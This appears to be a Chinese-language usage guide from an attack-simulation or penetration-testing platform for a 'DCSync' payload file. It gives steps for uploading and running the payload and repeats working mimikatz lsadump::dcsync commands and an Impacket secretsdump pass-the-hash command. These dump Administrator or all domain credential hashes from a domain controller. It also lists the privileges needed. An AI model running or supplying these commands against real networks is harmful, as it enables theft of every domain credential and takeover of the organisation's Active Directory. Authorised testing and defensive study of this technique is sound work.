## 📦 载荷使用说明：dcsync.sh

该载荷文件主要配合 **DCSync** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `DCSync` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

**配置示例 2**：
```bash
python3 secretsdump.py -hashes :NTLMHASH \\
  corp/admin@DC01 -just-dc
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## DCSync 域控同步

### 使用 Mimikatz
```
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

### 使用 secretsdump
```bash
python3 secretsdump.py -hashes :NTLMHASH \\
  corp/admin@DC01 -just-dc
```

### 所需权限
- Domain Admins
- Enterprise Admins
- Replicating Directory Changes All

- ✓ 无需登录域控即可拉取所有 Hash
- ⚠ 需要高权限账户